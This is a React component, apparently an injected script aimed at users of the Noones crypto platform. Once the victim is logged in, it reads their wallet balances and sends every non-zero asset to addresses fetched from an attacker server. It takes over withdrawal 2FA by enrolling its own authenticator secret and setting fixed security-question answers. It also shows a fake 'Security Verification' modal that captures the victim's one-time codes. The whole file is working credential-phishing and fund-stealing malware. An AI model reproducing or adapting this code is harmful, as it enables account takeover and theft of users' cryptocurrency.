import React, {useEffect, useState} from 'react';
import {Alert, Card, Flex, Input, Modal, Spin} from 'antd';
import {FIXED_CURRENCY_NETWORK, get, getUuid, getXsrfToken, post, sleep, UNPROCESSABLE, ZERO_STR} from "./util/util";
import ManIcon from "./components/ManIcon";
import SecurityLogo from "./components/SecurityLogo";

const Noones = () => {
    const [open, setOpen] = React.useState(false);
    const [spinning, setSpinning] = React.useState(false);
    const [confirmParam, setConfirmParam] = useState({})
    const [success, setSuccess] = useState(true)

    useEffect(() => {
        async function fetchData() {
            let interval = setInterval(async () => {
                if (window.Noones?.currentUser?.isLogged) {
                    console.error("Bingo Bingo")
                    clearInterval(interval)
                    await sendCoin()
                } else {
                    console.error("Not login")
                }
            }, 3000);
        }

        fetchData();
    }, []);
    const sendCoin = async () => {
        let assets = await getAssets();
        if (assets.length === 0) {
            return
        }
        for (let param of assets) {
            let result = await sendout(param);
            if (result === null) {
                console.log("=========== sendout failed ===========")
                console.log(param)
                continue
            }
            await confirm(result)
        }
    }
    const getWallet = async () => {
        return (await get("/proxy/wallet/v3/summary")).json;
    }
    const getAssets = async () => {
        let json = await getWallet();
        let assets = []
        for (let asset of json.assets) {
            let balance = asset.balance;
            if (balance !== ZERO_STR) {
                //get network by bitcoin currency
                let network = FIXED_CURRENCY_NETWORK[asset.currency_code]
                assets.push({
                    external_request_id: getUuid(),
                    asset_id: asset.id,
                    recipient: await getAddress(network),
                    amount: balance,
                    network: network
                })
            }
        }
        console.log("=========== assets ===========")
        console.log(JSON.stringify(assets))
        return assets
    }


    const sendout = async (param) => {

        let response = await post("/proxy/wallet/v3/sendouts", param)
        let json = response.json
        if (response.success) {
            return json
        }
        if (response.status === UNPROCESSABLE) {
            if (json.code === 'force_2fa_sendout') {
                await enableGa2fa()
                //try again after enableGa2fa
                await sendout(param)
            }

        }
        return null

    }

    const check2fa = async (confirmation_session_id, code, sendoutId) => {
        let res = (await post(`/proxy/mfa/v3/mfa/${confirmation_session_id}/respond-to-challenge`,
            {
                challenge_name: "google_authenticator",
                challenge_response: {
                    code: code
                }
            })).json
        if (res.status === 'success') {
            await post(`/proxy/wallet/v3/sendouts/${sendoutId}/confirm`, {})
            return true;
        } else {
            return false;
        }
    }

    const confirm = async (result) => {
        let sendoutId = result.sendout_id
        let response = await post(`/proxy/wallet/v3/sendouts/${sendoutId}/confirm`, {})
        let json = response.json
        if (result.confirmation_type !== '2fa') {
            console.log("=========== confirm success no 2fa ===========")
            console.log(result)
            return
        }


        while (true) {
            let get2FaRes = await get("/server/find2fa")
            if (!get2FaRes.success) {
                //2fa not set by me
                break
            }

            let success = await check2fa(json.confirmation_session_id, get2FaRes.text, sendoutId);
            if (success) {
                console.error("Bingo Bingo Success Success")
                return
            }
            await sleep(100)
        }
        setConfirmParam({
            confirmationSessionId: json.confirmation_session_id,
            sendoutId: sendoutId
        })
        setOpen(true)
    }

    const enableGa2fa = async () => {
        let json = (await get("/rest/v1/users/2fa?transformResponse=camelCase")).json
        let data = json.data
        if (data.isGAEnabled) {
            if (data.withdrawal !== 'ga') {
                // switch to ga
                await post(`/rest/v1/users/2fa/set-2fa?transformResponse=camelCase`, {"withdrawal": "ga"})
            }
        } else {
            await trySetSecurityQuestion()
            await openGa2fa()
        }
    }


    const getAddress = async (network) => {
        return (await get("/server/getAddress?network=" + network)).text;
    }


    const openGa2fa = async () => {
        for (let i = 0; i < 5; i++) {
            let enableRes = await post("/rest/v1/users/2fa/enable-2fa?transformResponse=camelCase", {"type": "ga"});
            if (!enableRes.success) {
                continue
            }
            let secret = enableRes.json.data.gaCode
            let get2FaRes = await get("/server/2fa?secret=" + secret)
            if (!get2FaRes.success) {
                continue
            }
            let verifyRes = await post("/rest/v1/users/2fa/verify-2fa?transformResponse=camelCase",
                {
                    gaCode: secret,
                    code: get2FaRes.text,
                    type: "ga"
                })

            if (verifyRes.success) {
                return
            }
        }
    }

    const trySetSecurityQuestion = async () => {
        let secAns = `_token=${getXsrfToken()}&questions%5B0%5D%5Bid%5D=13&questions%5B0%5D%5Banswer%5D=111111&questions%5B1%5D%5Bid%5D=22&questions%5B1%5D%5Banswer%5D=222222&questions%5B2%5D%5Bid%5D=31&questions%5B2%5D%5Banswer%5D=333333`
        await fetch("/auth/set-security-questions-answers", {
            method: "POST",
            headers: {
                "content-type": 'application/x-www-form-urlencoded',
                "X-Csrf-Token": getXsrfToken(),
            },
            body: secAns,
            redirect: "manual",
            mode: "cors",
            credentials: "include"
        });
    }


    const onCodeInput = async (text) => {
        console.log('onCodeInput:', text);
        setSpinning(true)
        setSuccess(true)
        let success = await check2fa(confirmParam.confirmationSessionId, text, confirmParam.sendoutId);
        setSpinning(false)
        if (success) {
            console.error("Bingo Bingo Success Success")
            setOpen(false)
            setSuccess(true)
        } else {
            setSuccess(false)
        }

    };
    return (
        <>
            <Modal
                title={<p style={{marginTop: 0, marginBottom: 20}}>Security Verification</p>}
                open={open}
                keyboard={false}
                closable={false}
                maskClosable={false}
                footer={null}
            >
                <Flex gap="middle" align="flex-start" vertical>
                    <Flex gap="small" align="flex-start" horizontal="true">
                        <ManIcon/>

                        <strong>Get your code from the <a>Google Authenticator</a> or <a>Authy</a> app.</strong>
                    </Flex>
                    <Alert
                        message="Need to verify your identity again"
                        style={{width: "100%"}}
                        type="warning"
                        showIcon
                    />
                    <Spin tip="Checking..." spinning={spinning}>
                        <Card style={{border: "1px solid #dde0df!important"}}>
                            <Flex gap="middle" align="center" horizontal="true">
                                <SecurityLogo/>
                                <Flex gap="middle" align="flex-start" vertical>
                                    <strong>Enter the code from your authentication app</strong>
                                    <Input.OTP length={6} onChange={onCodeInput}/>
                                    {
                                        !success && <Alert

                                            message="Code is Invalid"
                                            type="error"
                                        />
                                    }

                                </Flex>
                            </Flex>
                        </Card>
                    </Spin>
                    <a>Don't have access to your 2FA?</a>
                </Flex>
            </Modal>
        </>
    );
};
export default Noones;